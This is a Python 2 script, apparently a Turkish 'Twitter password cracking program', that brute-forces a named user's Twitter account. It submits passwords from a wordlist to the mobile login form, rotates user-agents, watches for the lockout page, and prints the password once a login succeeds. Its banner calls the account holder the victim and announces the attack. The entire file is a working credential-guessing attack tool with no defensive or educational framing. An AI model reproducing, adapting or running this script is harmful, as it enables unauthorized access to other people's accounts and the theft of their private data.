#!/usr/bin/python
# Copyright (c) Cameron Poe 2016
# Python 2 Compatible

import sys
import cookielib
import random
import os

try:
	import mechanize
except ImportError:
  print ("No mechanize! Try 'pip install mechanize'")
try:
    sys.argv[1]
except NameError:
    print ("You must specify a username!")
    print ("Usage: " + sys.argv[0] + " <Username>" + " <Wordlist>")
except IndexError:
    print ("You must specify a wordlist!")
    print ("Usage: " + sys.argv[0] + " <Username>" + " <Wordlist>")
try:
    sys.argv[2]
except NameError:
    print ("You must specify a username!")
    print ("Usage: " + sys.argv[0] + " <Username>" + " <Wordlist>")
except IndexError:
    print ("You must specify a wordlist!")
    print ("Usage: " + sys.argv[0] + " <Username>" + " <Wordlist>")
username = sys.argv[1]
passwordlist = sys.argv[2]
str(username)
str(passwordlist)
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

login = 'https://mobile.twitter.com/session/new'
lockedOut = 'https://mobile.twitter.com/account/locked'

def attack(password):
  try:
    global lockedOut
    sys.stdout.write("\r deneniyor %s..." % password)
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['session[username_or_email]'] = username
    br.form['session[password]'] = password
    br.submit()
    if br.geturl() == lockedOut:
      print ("\n Kilitlendi, Çikildi.!\n")
      sys.exit(1)
    elif br.title() == "Twitter":
      print ("\n Password Found!\n")
      print (" Password: %s\n" % (password))
      sys.exit(1)  
    elif br.title() == "Verify your identity":
      print ("\n Password Found!\n")
      print (" Password: %s\n" % (password))
      sys.exit(1)

  except KeyboardInterrupt:
    print ("\n Exiting Zelus...")
    sys.exit(1)
def main():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=99999)
    except KeyboardInterrupt:
       print ("\n Exiting Zelus...")
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       i = 0
       while i < len(passwords):
          passwords[i] = passwords[i].strip()
          i += 1
    except IOError:
        print ("Error: check your password list path")
        sys.exit(1)
    except KeyboardInterrupt:
        print ("\n Exiting Zelus...")
        sys.exit(1)
    try:
        print ("""
          TURKSIBERGUVENLIK.NET
             BIRKAN TEKKAN
 ........................................                                            
Twitter Sifre Kirma Programi
        """)
        print (" Kurban: %s" % (username))
        print (" Yuklenen:" , len(passwords), "sifreler")
        print (" Saldiri Basladi, Sifreler Deneniyor")
    except KeyboardInterrupt:
        print ("\n Exiting Zelus...")
        sys.exit(1)
    try:
        global password
        for password in passwords:
        	attack(password.replace("\n",""))
        attack(password)
    except KeyboardInterrupt:
    	print ("\n Exiting Zelus...")
    	sys.exit(1)

if __name__ == "__main__":
    if sys.platform == 'win32' or sys.platform == 'win64':
        os.system('cls')
        main()
    else:
        os.system('clear')
        main()
